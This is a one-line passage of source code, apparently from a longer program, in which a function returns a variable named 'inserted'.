        return inserted
